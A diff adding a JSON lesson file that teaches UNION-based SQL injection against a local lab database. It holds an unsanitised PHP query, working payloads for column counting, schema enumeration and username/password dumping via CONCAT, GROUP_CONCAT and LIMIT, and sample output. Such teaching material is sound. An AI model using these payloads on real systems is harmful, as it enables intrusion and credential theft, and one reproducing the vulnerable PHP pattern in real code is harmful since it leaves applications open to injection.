@@ -1,0 +1,394 @@
+[
+  {
+    "type": "section_heading",
+    "id": "union-sqli-intro",
+    "text": "What is UNION-Based SQL Injection?"
+  },
+  {
+    "type": "order_block",
+    "id": "union-sqli-definition",
+    "text": "UNION-based SQL Injection is a technique where an attacker uses the SQL <highlight>UNION</highlight> operator to combine results from the original query with a malicious query. This allows attackers to retrieve data from other tables in the database."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-lab-database",
+    "text": "Example Lab Database"
+  },
+  {
+    "type": "code_block",
+    "id": "union-lab-db-code",
+    "language": "sql",
+    "code": "CREATE DATABASE union_sqli_lab;\n\nUSE union_sqli_lab;\n\nCREATE TABLE products (\n id INT AUTO_INCREMENT PRIMARY KEY,\n name VARCHAR(100),\n description TEXT\n);\n\nINSERT INTO products (name,description) VALUES\n('Laptop','Gaming Laptop'),\n('Phone','Android Phone');"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-db-content",
+    "text": "Database Content"
+  },
+  {
+    "type": "output_block",
+    "id": "union-db-output",
+    "language": "text",
+    "code": "id | name   | description\n1  | Laptop | Gaming Laptop\n2  | Phone  | Android Phone"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-vulnerable-query",
+    "text": "Example Vulnerable Query"
+  },
+  {
+    "type": "code_block",
+    "id": "union-vulnerable-query-code",
+    "language": "sql",
+    "code": "SELECT name, description FROM products WHERE id=1;"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-vulnerable-code",
+    "text": "Example Vulnerable Backend Code"
+  },
+  {
+    "type": "code_block",
+    "id": "union-vulnerable-code-example",
+    "language": "php",
+    "code": "$id = $_GET['id'];\n$query = \"SELECT name, description FROM products WHERE id=$id\";"
+  },
+  {
+    "type": "order_block",
+    "id": "union-vulnerable-analysis",
+    "text": "The application directly inserts user input into the SQL query. This allows attackers to modify the query structure and perform SQL injection."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-normal-request",
+    "text": "Normal Application Request"
+  },
+  {
+    "type": "code_block",
+    "id": "union-normal-url",
+    "language": "text",
+    "code": "http://localhost:8000/index.php?id=1"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-normal-query",
+    "text": "Query Executed by Database"
+  },
+  {
+    "type": "code_block",
+    "id": "union-normal-query-code",
+    "language": "sql",
+    "code": "SELECT name, description FROM products WHERE id=1;"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-normal-output",
+    "text": "Application Output"
+  },
+  {
+    "type": "output_block",
+    "id": "union-normal-output-block",
+    "language": "text",
+    "code": "Laptop\nGaming Laptop"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-column-discovery",
+    "text": "Discovering Column Count Using ORDER BY"
+  },
+  {
+    "type": "code_block",
+    "id": "union-orderby-payloads",
+    "language": "text",
+    "code": "?id=1 ORDER BY 1\n?id=1 ORDER BY 2\n?id=1 ORDER BY 3"
+  },
+  {
+    "type": "order_block",
+    "id": "union-orderby-analysis",
+    "text": "Attackers increase the column number until the database throws an error. The highest valid number indicates how many columns the original query returns."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-column-test",
+    "text": "Testing UNION Injection"
+  },
+  {
+    "type": "code_block",
+    "id": "union-test-payload",
+    "language": "text",
+    "code": "?id=-1 UNION SELECT 1,2"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-test-query",
+    "text": "Final Query Executed"
+  },
+  {
+    "type": "code_block",
+    "id": "union-test-query-code",
+    "language": "sql",
+    "code": "SELECT name, description FROM products WHERE id=-1\nUNION\nSELECT 1,2;"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-test-output",
+    "text": "Application Output"
+  },
+  {
+    "type": "output_block",
+    "id": "union-test-output-block",
+    "language": "text",
+    "code": "1\n2"
+  },
+  {
+    "type": "order_block",
+    "id": "union-test-analysis",
+    "text": "If the numbers appear in the output, it means the UNION injection worked and the attacker can control the returned data."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-database-name",
+    "text": "Extracting Database Name"
+  },
+  {
+    "type": "code_block",
+    "id": "union-db-payload",
+    "language": "text",
+    "code": "?id=-1 UNION SELECT database(),2"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-db-output",
+    "text": "Database Output"
+  },
+  {
+    "type": "output_block",
+    "id": "union-db-output-block",
+    "language": "text",
+    "code": "union_sqli_lab"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-table-enumeration",
+    "text": "Enumerating Tables"
+  },
+  {
+    "type": "code_block",
+    "id": "union-tables-payload",
+    "language": "text",
+    "code": "?id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-tables-output",
+    "text": "Tables Found"
+  },
+  {
+    "type": "output_block",
+    "id": "union-tables-output-block",
+    "language": "text",
+    "code": "products\nusers\norders"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-column-enumeration",
+    "text": "Enumerating Columns"
+  },
+  {
+    "type": "code_block",
+    "id": "union-columns-payload",
+    "language": "text",
+    "code": "?id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-columns-output",
+    "text": "Columns Found"
+  },
+  {
+    "type": "output_block",
+    "id": "union-columns-output-block",
+    "language": "text",
+    "code": "id\nusername\npassword\nemail"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-concat",
+    "text": "Using CONCAT to Merge Data"
+  },
+  {
+    "type": "order_block",
+    "id": "union-concat-explanation",
+    "text": "Sometimes the application only displays one column. Attackers use the SQL <highlight>CONCAT()</highlight> function to merge multiple fields into a single column so that more data can be displayed."
+  },
+  {
+    "type": "code_block",
+    "id": "union-concat-example",
+    "language": "text",
+    "code": "?id=-1 UNION SELECT CONCAT(username,':',password),2 FROM users"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-concat-output",
+    "text": "Merged Output"
+  },
+  {
+    "type": "output_block",
+    "id": "union-concat-output-block",
+    "language": "text",
+    "code": "admin:admin123\njohn:qwerty\nalice:123123"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-data-dump",
+    "text": "Dumping Entire Table Data"
+  },
+  {
+    "type": "order_block",
+    "id": "union-dump-explanation",
+    "text": "After discovering the table and column names, attackers can dump the entire table to extract sensitive information such as usernames and passwords."
+  },
+  {
+    "type": "code_block",
+    "id": "union-dump-payload",
+    "language": "text",
+    "code": "?id=-1 UNION SELECT username,password FROM users"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-dump-output",
+    "text": "Dumped Data"
+  },
+  {
+    "type": "output_block",
+    "id": "union-dump-output-block",
+    "language": "text",
+    "code": "admin | admin123\njohn  | qwerty\nalice | 123123"
+  },
+{
+  "type": "section_heading",
+  "id": "union-group-concat",
+  "text": "Using GROUP_CONCAT for Full Data Dump"
+},
+{
+  "type": "order_block",
+  "id": "union-group-concat-explain",
+  "text": "Sometimes the application only shows a single row of output. Attackers use the SQL <highlight>GROUP_CONCAT()</highlight> function to combine multiple rows into one single result. This allows dumping a large amount of data in a single response."
+},
+{
+  "type": "code_block",
+  "id": "union-group-concat-payload",
+  "language": "text",
+  "code": "?id=-1 UNION SELECT GROUP_CONCAT(username,':',password),2 FROM users"
+},
+{
+  "type": "section_heading",
+  "id": "union-group-concat-output",
+  "text": "Combined Dump Output"
+},
+{
+  "type": "output_block",
+  "id": "union-group-concat-output-block",
+  "language": "text",
+  "code": "admin:admin123,john:qwerty,alice:123123"
+},
+
+{
+  "type": "section_heading",
+  "id": "union-limit-intro",
+  "text": "Using LIMIT to Extract Specific Rows"
+},
+{
+  "type": "order_block",
+  "id": "union-limit-explain",
+  "text": "Some applications restrict how many results are displayed. Attackers can use the SQL <highlight>LIMIT</highlight> clause to retrieve specific rows from the database one by one."
+},
+{
+  "type": "code_block",
+  "id": "union-limit-example1",
+  "language": "text",
+  "code": "?id=-1 UNION SELECT username,password FROM users LIMIT 0,1"
+},
+{
+  "type": "code_block",
+  "id": "union-limit-example2",
+  "language": "text",
+  "code": "?id=-1 UNION SELECT username,password FROM users LIMIT 1,1"
+},
+{
+  "type": "code_block",
+  "id": "union-limit-example3",
+  "language": "text",
+  "code": "?id=-1 UNION SELECT username,password FROM users LIMIT 2,1"
+},
+{
+  "type": "section_heading",
+  "id": "union-limit-output",
+  "text": "Row by Row Extraction"
+},
+{
+  "type": "output_block",
+  "id": "union-limit-output-block",
+  "language": "text",
+  "code": "admin | admin123\njohn  | qwerty\nalice | 123123"
+},
+
+{
+  "type": "section_heading",
+  "id": "union-offset-intro",
+  "text": "Understanding LIMIT Offset"
+},
+{
+  "type": "order_block",
+  "id": "union-offset-explain",
+  "text": "The LIMIT clause works as LIMIT offset,count. The offset specifies where the database should start returning rows. Attackers increase the offset value to iterate through the entire table."
+},
+  {
+    "type": "section_heading",
+    "id": "union-important-rules",
+    "text": "Important Rules for UNION SQL Injection"
+  },
+  {
+    "type": "explanation",
+    "id": "union-rules-list",
+    "title": "Requirements for UNION Injection",
+    "items": [
+      "The number of columns must match the original query",
+      "Data types should be compatible",
+      "The injected query must return the same column count",
+      "At least one column must be visible in the application output"
+    ]
+  },
+
+  {
+    "type": "section_heading",
+    "id": "union-conclusion",
+    "text": "Conclusion"
+  },
+  {
+    "type": "order_block",
+    "id": "union-summary",
+    "text": "UNION-based SQL Injection allows attackers to merge malicious queries with legitimate queries. This enables attackers to enumerate databases, discover tables and columns, and extract sensitive data from the database."
+  }
+]
